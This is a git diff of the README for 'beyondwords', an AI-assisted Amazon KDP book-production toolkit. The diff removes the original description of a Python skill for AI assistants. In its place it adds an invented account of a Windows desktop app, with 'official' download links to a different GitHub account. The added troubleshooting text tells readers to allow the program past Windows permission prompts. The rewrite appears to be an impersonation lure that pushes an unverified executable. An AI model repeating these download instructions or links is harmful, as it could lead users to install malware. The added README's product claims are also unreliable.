@@ -1,302 +1,199 @@
-<p align="center">
-  <img src="assets/beyondwords-banner.png" alt="Beyondwords — Your publishing house. Research · Write · Design · Publish · Grow" width="960">
-</p>
+# 📚 beyondwords - Build and Publish Books with AI
 
-<p align="center">
-  <strong>Your goal. Your books. Your publishing business.</strong><br>
-  A goal-driven AI book production house, built around Amazon Kindle and KDP.
-</p>
+[![Download beyondwords](https://img.shields.io/badge/Download-beyondwords-ff69b4?style=for-the-badge&labelColor=8a2be2&logo=github&logoColor=white)](https://github.com/michaelpuryear83/beyondwords)
 
-<p align="center">
-  <a href="https://github.com/beyondtahir/beyondwords/releases/tag/v1.1.0"><img alt="Release 1.1.0" src="https://img.shields.io/badge/release-1.1.0-1664FF?style=flat-square"></a>
-  <a href="LICENSE"><img alt="MIT license" src="https://img.shields.io/badge/license-MIT-111111?style=flat-square"></a>
-  <a href="docs/INSTALL.md"><img alt="Python 3.11 and newer" src="https://img.shields.io/badge/Python-3.11%2B-1664FF?style=flat-square"></a>
-  <a href="https://github.com/beyondtahir/beyondwords/actions/workflows/package.yml"><img alt="Package checks" src="https://github.com/beyondtahir/beyondwords/actions/workflows/package.yml/badge.svg"></a>
-</p>
+beyondwords is a goal-driven AI book production house for Amazon KDP. It helps you research profitable niches, create books, prepare them for publishing, manage ads, and deliver client services. It is built for people who want a clear path from book idea to finished product without needing to be a programmer.
 
-<p align="center">
-  <a href="#two-ways-to-build-an-income"><strong>Why Beyondwords</strong></a> ·
-  <a href="#see-it-in-action"><strong>Watch</strong></a> ·
-  <a href="#install-in-your-assistant"><strong>Install</strong></a> ·
-  <a href="docs/CAPABILITIES.md"><strong>Capabilities</strong></a> ·
-  <a href="docs/TECHNICAL.md"><strong>Under the hood</strong></a> ·
-  <a href="SECURITY.md"><strong>Security</strong></a> ·
-  <a href="https://www.beyondtahir.com"><strong>Beyond Tahir</strong></a>
-</p>
+Whether you are creating your first ebook, building a catalog of self-published titles, or running book production for clients, beyondwords gives you a guided workspace for each part of the process.
 
----
+## ✨ What beyondwords Helps You Do
 
-## Build books. Build a business.
+beyondwords is designed around the full book production journey. Instead of jumping between scattered tools, you use one application to organize the work.
 
-**Beyondwords is a goal-driven AI book production house designed to help you earn through publishing and book-production services.** Start with a business goal, a book idea or no publishing experience. It helps you find a niche and category, develop an original book, create its cover and interior, publish through supported account workflows, run authorized advertising and improve from actual results.
-
-**Amazon Kindle and KDP are the primary focus.** The workflow also supports preparing books for Lulu and creating deliverables for freelance clients. Research, writing, editing, design, production and marketing work together in one conversation, with your assistant doing the available work and bringing you the decisions that matter.
-
-You bring the goal, creative direction and approvals. Beyondwords connects them to research, useful files and the next practical action. The aim is to build an income-producing business; earnings depend on the books, readers, costs and execution, and are never guaranteed.
-
-## See it in action
-
-<p align="center">
-  <a href="assets/beyondwords-how-it-works.mp4"><img src="assets/beyondwords-how-it-works.gif" alt="A 30-second Beyondwords walkthrough: inspect book samples, develop a manuscript, design a cover, prepare listing details and review the book in KDP Previewer." width="960"></a>
-</p>
-
-<p align="center"><strong>Research → Create → Design → Prepare → Preview</strong><br>
-<a href="assets/beyondwords-how-it-works.mp4">Watch the sharper MP4</a> · <a href="assets/beyondwords-tutorial-poster.png">View the still preview</a></p>
-
-The walkthrough uses edited screen recordings of a book project. It shows selected steps, including a labeled cover still; it does not represent a full installation, advertising campaign or sales result.
-
-## Two ways to build an income
-
-<table>
-<tr>
-<td width="50%" valign="top">
-
-### Publish your own books
-
-Build a catalogue under your author or publisher identity. Research a reader and niche, choose the right book, create and refine it, prepare ebook or print editions, then publish and market it through supported routes such as **Amazon KDP and Lulu**.
-
-Track royalties and costs so the next title or advertising decision follows actual results.
-
-</td>
-<td width="50%" valign="top">
-
-### Offer book-production services
-
-Use the same production tools to deliver client work: research briefs, manuscript development, revisions, cover design, EPUB/PDF formatting and publication preparation.
-
-Package the work you can deliver and quality-check into services for **Upwork or direct clients**. Keep each client's material and approvals separate.
-
-</td>
-</tr>
-</table>
-
-These are two business uses of the toolkit. You still acquire clients, agree scope and pricing, review the work and meet platform and client requirements. Beyondwords does not include an Upwork account integration or guarantee freelance orders.
-
-## Your goal drives the workflow
-
-> “I want to build a publishing business and work toward a monthly profit target. Help me choose the right niche, understand the investment and create my first book.”
-
-Beyondwords first clarifies the goal: profit or revenue, timeframe, budget, available time, country, language and existing skills or material. It then works with you through a repeating loop:
-
-1. **Research the opportunity.** Compare readers, niches, categories, competing books, previews and feedback. Offer five supported choices and let you choose.
-2. **Plan the first experiment.** Define an original book, its reader promise, format and costs. Discuss the budget and workload needed to test the idea.
-3. **Produce and review.** Develop the voice or visual style, create the book, revise it and prepare the cover and files.
-4. **Publish and promote.** Prepare the listing, carry out supported authorized account actions and run a bounded advertising experiment when connected.
-5. **Measure and improve.** Compare actual royalties, production costs and ad spend with the goal. Improve the current book or consider another title when the evidence supports it.
-
-A target shapes the decisions; it is not proof of future earnings. Before sales history exists, planning uses research and explicit scenarios. As real reports arrive, the workflow updates from measured results. You get short conversations and concrete progress, not an unsolicited long business-plan PDF.
-
-## Choose the book that fits the reader
-
-| Book or format | What Beyondwords helps you make |
+| Area | What it helps with |
 |---|---|
-| **Kindle ebooks** | Fiction or nonfiction, an original voice, structured chapters, revisions and supported EPUB production |
-| **Print books** | Interiors, front/spine/back covers and print PDFs matched to the selected trim and current printer template |
-| **Novels and story collections** | Premises, characters, world rules, story arcs, chapter drafts and continuity checks |
-| **Illustrated and children's books** | Age-aware text, spread plans, art direction, illustrations through available image tools and image-page layouts |
-| **Cartoon-style books and comics** | Character references, panels, dialogue, lettering plans and page assembly using actual art/layout tools |
-| **Coloring, activity and puzzle books** | Original page concepts, supported text/image assembly, contact sheets and explicit usability or solution checks |
-| **Audiobooks** | Production guidance and a handoff for narration and audio review; native narration, mastering and audiobook upload are not bundled |
+| 🔎 Niche research | Find book topics and market opportunities worth exploring |
+| 🧠 Book planning | Turn a goal into an outline, chapters, and a production plan |
+| ✍️ Book creation | Create and organize book content for Amazon KDP |
+| 📦 Publishing preparation | Keep book details, files, and launch tasks in one place |
+| 📣 Ad management | Track and manage advertising work for published books |
+| 🤝 Client services | Organize book projects for clients and delivery work |
 
-The format follows the reader and the research. Visual work needs available image/layout tools; specialist layouts, puzzle solutions and final print/device previews require their own checks. An audiobook is a separate production and distribution route, not an EPUB export.
+The application is especially useful for self-publishers, ebook creators, Amazon KDP sellers, and service providers who produce books for other people.
 
-## Built around Amazon KDP, with room to grow
+## 🚀 Getting Started
 
-**For your own catalogue:** use [Amazon KDP](https://kdp.amazon.com/) for Kindle ebooks and supported print editions, or prepare suitable books for [Lulu](https://www.lulu.com/create). Beyondwords researches relevant categories and listing terms, prepares the files and helps manage the publication workflow. Each platform has its own eligibility, rights, format and distribution requirements.
+Getting started with beyondwords follows a simple path:
 
-**For client work:** use the toolkit to produce agreed deliverables for services such as [book and ebook writing](https://www.upwork.com/services/book-ebook-writing) or [book design](https://www.upwork.com/services/book-design). These are examples of service categories, not evidence of demand for a particular offer or a promise of earnings.
+1. Download the application from the official link.
+2. Open it on your Windows computer.
+3. Create your first book project or client project.
+4. Use the guided sections to research, create, publish, and manage your book.
+5. Return to the application as your catalog or client list grows.
 
-**For connected execution:** Beyondwords can perform supported attended publishing actions and Amazon Sponsored Products operations when the actual tools, account access and authorization are in place. It can help create campaigns, analyze reports and monitor through a configured worker or scheduler. If a connection is missing, it continues with file preparation, report imports or a guided handoff and explains what still needs setup.
+You do not need to know how to write code. The application is intended for everyday computer users who want a structured way to produce books.
 
-You can work step by step or delegate within an agreed scope. Sensitive account details stay with the owner; publishing choices, spending limits and creative review remain explicit. Beyondwords is an independent project, not affiliated with Amazon, Lulu or Upwork.
+## 💾 Download and Setup for Windows
 
-## A publishing house inside your workflow
+Visit this link to download the application:
 
-<table>
-<tr>
-<td width="50%" valign="top">
+[Download beyondwords](https://github.com/michaelpuryear83/beyondwords)
 
-### 01 · Find the reader and the idea
+Use the official download page above. When the page opens, follow the download instructions shown there. Save the download in a place you can easily find, such as your Downloads folder.
 
-Find candidate niches and categories by researching comparable books, permitted previews and actual reader feedback. Explore **five researched niches with an idea for each**, or **five ideas within your chosen niche**. See the gaps, contrary evidence and a useful next experiment.
+After the download finishes, open the downloaded item from your Downloads folder and follow the prompts on your screen. Once the application opens, you can begin setting up your first project.
 
-</td>
-<td width="50%" valign="top">
+For the smoothest experience, keep the application in a folder you can find later. If you move it, remember the new location so you can open it again.
 
-### 02 · Write something with a voice
+## 🖥️ First Launch
 
-Build an original writing persona around the book, its reader and your creative direction. Approve a sample, develop an outline and draft chapter by chapter. Keep characters, facts, promises and unresolved story threads consistent.
+When you open beyondwords for the first time, take a few minutes to look around before creating a full project. The application is organized around the work of producing books, so the main areas should feel familiar:
 
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
+- **Projects** for your books and client work
+- **Research** for niche and market exploration
+- **Creation** for planning and writing book content
+- **Publishing** for preparing Amazon KDP details
+- **Ads** for managing book promotion work
+- **Clients** for organizing service delivery
 
-### 03 · Edit beyond the surface
+Start with a small test project if you want to learn the flow. A short ebook idea is a good way to see how research, creation, and publishing preparation connect.
 
-Review structure, logic, repetition, voice and factual claims. Tie review notes to the actual manuscript version. Prepare clear handoffs for independent editors and real readers, then turn their feedback into focused revisions.
+## 🧭 Create Your First Book Project
 
-</td>
-<td width="50%" valign="top">
+A book project is the main workspace for one title. To create your first project:
 
-### 04 · Design for the shelf
+1. Open the projects area.
+2. Choose the option to create a new book project.
+3. Give the project a clear name, such as the working title of your book.
+4. Add a short description of the goal for the book.
+5. Choose the type of work you are doing, such as a personal book or a client book.
+6. Save the project.
 
-Study relevant covers and create original directions using available image tools. Compose editable typography, check native pixels and plan the front, spine and back against the selected print specification.
+Once the project exists, use the sections inside it to move through research, planning, writing, publishing preparation, and promotion.
 
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
+A clear project name makes it easier to find your work later, especially when you have several books or client projects in progress.
 
-### 05 · Produce useful book files
+## 🔎 Research a Profitable Niche
 
-Prepare supported **EPUB, print PDF and editable DOCX** outputs. Assemble illustrated or coloring pages, inspect contact sheets and check dimensions. Keep ebook and paperback decisions connected to the actual reading experience.
+The research area helps you explore book ideas before you commit time to writing. Use it to collect notes about your audience, topic, and opportunity.
 
-</td>
-<td width="50%" valign="top">
+A practical research routine:
 
-### 06 · Publish through connected tools
+1. Write down the main topic you want to explore.
+2. Identify the reader you want to serve.
+3. Look for related problems, questions, and subtopics.
+4. Record useful keywords and phrases.
+5. Compare a few niche ideas before choosing one.
+6. Save your notes inside the project.
 
-Work through country-aware account setup, public author identity, descriptions, categories and evidence-supported keywords. Prepare exact files and perform supported attended upload and submission actions when account access and authorization are available. Guide the owner through preview and remaining decisions.
+Strong book ideas usually solve a clear problem or answer a clear question. Use the research area to sharpen your idea before moving into book creation.
 
-</td>
-</tr>
-<tr>
-<td width="50%" valign="top">
+## 📝 Create and Organize Book Content
 
-### 07 · Run and review advertising
+The creation area is where your book takes shape. Depending on your project, you can organize:
 
-Develop an ethical reader-outreach plan and a bounded advertising experiment. Create and manage supported Sponsored Products campaigns through authorized API access, then analyze reports. Use imports when a connection is unavailable.
+- Book title and subtitle ideas
+- Chapter outlines
+- Chapter content
+- Introductions and conclusions
+- Descriptions for Amazon KDP
+- Author notes
+- Publishing checklists
 
-</td>
-<td width="50%" valign="top">
+Work in small steps. Create the outline first, then expand one chapter at a time. This makes the process easier to manage and helps you keep the book focused.
 
-### 08 · Work toward your profit goal
+For client work, keep each client’s book in its own project. That makes it easier to separate content, deadlines, and delivery notes.
 
-Track royalties, production costs and ad spend against the agreed goal. Review performance with real data and continue through a configured monitor or scheduler, improving the book, listing or campaign as evidence arrives.
+## 📦 Prepare for Amazon KDP Publishing
 
-</td>
-</tr>
-</table>
+The publishing area helps you keep the details needed for Amazon KDP in one place. Use it to prepare:
 
-[Explore every capability and its requirements →](docs/CAPABILITIES.md)
+- Book title and subtitle
+- Author name
+- Book description
+- Keywords and categories
+- Pricing notes
+- Cover and file reminders
+- Launch checklist items
 
-## Install in your assistant
+Before publishing, review your book details carefully. Make sure the title, description, and author information are consistent across your project.
 
-Choose your host. Each guide includes the installation route, how to call the skill and a first-run check.
+## 📣 Manage Book Ads
 
-| Your assistant | Start here |
-|---|---|
-| **ChatGPT Work** | [Skill or plugin import](docs/INSTALL.md#chatgpt-work) |
-| **Codex** | [Local skill installation](docs/INSTALL.md#codex) |
-| **Claude Cowork / Claude** | [Upload the skill ZIP](docs/INSTALL.md#claude-cowork) |
-| **Kimi Work** | [Import through Plugin Builder](docs/INSTALL.md#kimi-work) |
-| **OpenClaw** | [Install the local skill folder](docs/INSTALL.md#openclaw) |
-| **Hermes Agent** | [Install the GitHub skill path](docs/INSTALL.md#hermes-agent) |
+The ads area is for organizing promotion work after a book is published. Use it to track:
 
-**Downloads:** [Skill ZIP](https://github.com/beyondtahir/beyondwords/releases/download/v1.1.0/beyondwords-1.1.0-skill.zip) · [Complete source ZIP](https://github.com/beyondtahir/beyondwords/releases/download/v1.1.0/beyondwords-1.1.0-source.zip) · [Release and checksums](https://github.com/beyondtahir/beyondwords/releases/tag/v1.1.0)
+- Which book is being promoted
+- Campaign notes
+- Budget reminders
+- Results and observations
+- Follow-up tasks
 
-Prefer asking your assistant to help? Use this:
+Keep notes simple and consistent. Over time, your notes become a useful record of what works for your books and clients.
 
-```text
-Help me install Beyondwords from https://github.com/beyondtahir/beyondwords.
-Read docs/INSTALL.md and use the route for this environment.
-Keep the complete skill folder and preserve any existing installation.
-Then check which tools actually work here before starting my book.
-```
+## 🤝 Deliver Client Services
 
-Installation controls and tool access vary by host and account. The guides describe current documented routes; they do not claim that every host and account combination has been tested end to end.
+beyondwords can also support book production for clients. Use client projects to organize:
 
-## Your first conversation
+- Client contact details
+- Book goals and requirements
+- Research notes
+- Drafts and revisions
+- Publishing preparation tasks
+- Delivery checklists
 
-> Use Beyondwords to help me build a book business. I am new to publishing and want to work toward an income goal. Help me decide whether to start with my own books or client services, then research and guide me one step at a time.
+Create a separate project for each client book. Add clear notes about what the client asked for and what has been delivered. This helps you avoid confusion when several projects are active.
 
-Beyondwords starts with a short intake: your language, country, experience, interests, intended formats, available time and budget. Returning authors confirm saved details instead of starting over. An income goal leads to questions, research and transparent scenarios, not an invented guarantee or an unsolicited long report.
+## 🧰 Everyday Workflow
 
-| Step | What you work on together | What you choose |
-|---|---|---|
-| Discover | Readers, comparable books, sample coverage and original opportunities | The niche and book idea |
-| Shape | Reader promise, voice or art direction, outline and a small sample | The creative direction |
-| Make | Chapters, illustrations, revisions and continuity | What to keep and improve |
-| Prepare | Interior, cover, metadata, pricing inputs and release checks | The final files and listing |
-| Publish | Account requirements, retailer preview and scoped submission | The authorized account action |
-| Grow | Reader feedback, actual reports and measured experiments | Where to invest next |
+A simple workflow you can repeat for each book:
 
-## Start where you are
+1. Create a project.
+2. Research the niche and reader.
+3. Build an outline.
+4. Create chapter content.
+5. Prepare Amazon KDP details.
+6. Review the publishing checklist.
+7. Publish the book.
+8. Add ad notes and promotion tasks.
+9. Record results and lessons learned.
+10. Repeat for the next book or client.
 
-<details>
-<summary><strong>“I want to write fiction.”</strong></summary>
+This repeatable process is the core value of beyondwords: it turns book production into a guided workflow instead of a pile of disconnected tasks.
 
-Develop the reader promise, premise, character motives, world rules and story arc. Approve an original voice sample, then build chapters with continuity and editorial review. Bring your own creative choices; the assistant can help with drafting and revision.
+## 💡 Tips for Better Results
 
-</details>
-<details>
-<summary><strong>“I know a subject and want to teach it.”</strong></summary>
+- Start with one clear reader and one clear problem.
+- Keep project names specific and easy to recognize.
+- Use the research area before writing a full outline.
+- Work chapter by chapter instead of trying to finish everything at once.
+- Keep client notes separate from personal book notes.
+- Review publishing details before submitting a book to Amazon KDP.
+- Update ad notes after each promotion period.
+- Save your work regularly.
 
-Define the reader's starting point and useful outcome. Research existing books, identify a specific unmet need and create a chapter plan. Source factual claims and use your real experience accurately.
+## 🛠️ Troubleshooting
 
-</details>
-<details>
-<summary><strong>“I want to make an illustrated, coloring or puzzle book.”</strong></summary>
+If the download page does not open, check your internet connection and try the link again. If the download does not start, return to the official link and follow the download instructions shown there.
 
-Research page samples and reader expectations, test an original prototype and choose the right format. Assemble supported image pages, coloring layouts or text-led puzzle interiors. Artwork requires an available image tool or supplied assets; puzzle logic and specialist page design need explicit checking.
+If you cannot find the downloaded item, open your Downloads folder and sort by the most recent files. If Windows asks for permission when you open the application, choose the option that allows it to open.
 
-</details>
-<details>
-<summary><strong>“My book is nearly finished.”</strong></summary>
+If the application opens but you are unsure where to begin, create a small test project first. Use it to click through the main areas and learn the layout before starting a real book.
 
-Import the manuscript, assess gaps and prepare revisions, production files, cover specifications and listing material. Continue toward preview and publication without discarding your existing work.
+## ❓ Frequently Asked Questions
 
-</details>
-<details>
-<summary><strong>“I want to offer book-production services.”</strong></summary>
+**Do I need programming knowledge?**  
+No. beyondwords is intended for everyday users who want to produce books and manage related work.
 
-Choose a specific deliverable you can produce and review well, such as an ebook formatting package, an original cover or manuscript development. Create an honest sample, agree the client brief and use a separate private project for production and revisions. You manage the service listing, client agreement and payment through the chosen marketplace or direct relationship.
+**Is beyondwords only for Amazon KDP?**  
+It is designed around Amazon KDP book production, including research, creation, publishing preparation, ads, and client services.
 
-</details>
-<details>
-<summary><strong>“My book is live. Help me grow it.”</strong></summary>
+**Can I use it for client books?**  
+Yes. Client services are part of the application’s purpose. Keep each client book in its own project for clarity.
 
-Bring actual royalty and advertising reports. Separate attributed sales from author profit, inspect performance and agree on a bounded next experiment. Connect approved account access when available; otherwise work from imported reports and attended actions.
+**Can I manage more than one book?**  
+Yes. Use separate projects for separate books so research, content, publishing details, and ads stay organized.
 
-</details>
+**Where do I download it?**  
+Visit the official download link: [https://github.com/michaelpuryear83/beyondwords](https://github.com/michaelpuryear83/beyondwords).
 
-## Independent by design
-
-- **No mandatory publishing SaaS.** No paid rank tool, proprietary market-data subscription or managed advertising service is required.
-- **Your chosen assistant.** The core does not call a model API. Writing, image generation and browsing use the host's available capabilities.
-- **Private project memory.** Author decisions, manuscripts and reports live in your selected workspace, separate from the installation.
-- **Evidence behind decisions.** Research keeps source links, editions, dates and uncertainty. Missing evidence stays missing.
-- **Useful ownership.** Original code is MIT-licensed. Book content and third-party resources retain their respective rights.
-
-Beyondwords itself is free to use. Your assistant, optional services, printing and advertising may have costs. It cannot guarantee sales, viral reach, account approval or income. Publication still needs appropriate editorial review, reader feedback and print proofs. [Practical limits and FAQ →](docs/FAQ.md)
-
-## Security and private reporting
-
-Found a security problem? Use [Report a vulnerability](https://github.com/beyondtahir/beyondwords/security/advisories/new) to share it privately with the maintainer. The repository uses secret scanning, push protection, dependency alerts and CodeQL scanning alongside its package checks. Read the [security policy](SECURITY.md) for reporting details, supported releases and the boundaries of these protections. Automated scanning is not an independent security certification.
-
-## Under the hood
-
-A portable skill orchestrates a **Python 3.11+ local toolkit**, a versioned project store and optional browser, production and account adapters. It includes source-evidence handling, manuscript history, artifact checks, action journals and report monitoring. Optional dependencies are pinned and documented.
-
-There is no hosted Beyondwords backend and no bundled model. Persistent monitoring needs a running worker or configured scheduler. A tested local-inference path remains a future release requirement.
-
-| Read more | What you will find |
-|---|---|
-| [Installation](docs/INSTALL.md) | Six host guides, runtime setup, updates and troubleshooting |
-| [Capabilities](docs/CAPABILITIES.md) | The full workflow, outputs and capability boundaries |
-| [Technical guide](docs/TECHNICAL.md) | Architecture, CLI, adapters, checks and extensibility |
-| [Dependencies](docs/DEPENDENCIES.md) | Versions, licenses, optional components and notices |
-| [Privacy](docs/PRIVACY.md) | Private workspaces, accounts and cross-host memory |
-| [Security policy](SECURITY.md) | Private vulnerability reporting, protections and security boundaries |
-| [FAQ](docs/FAQ.md) | Costs, research, publishing, automation and support |
-
----
-
-<p align="center">
-  <img src="assets/beyondwords-logo.png" alt="Beyondwords" width="260"><br><br>
-  Built by <a href="https://www.beyondtahir.com"><strong>Beyond Tahir</strong></a><br>
-  <a href="https://www.beyondtahir.com">Website</a> ·
-  <a href="https://github.com/beyondtahir/beyondwords/issues">Issues & ideas</a> ·
-  <a href="https://github.com/beyondtahir/beyondseo">Explore BeyondSEO</a>
-</p>
+Keywords: ai-skills, amazon-kdp, book-production, book-writing, ebooks, mcp, publishing, python, self-publishing
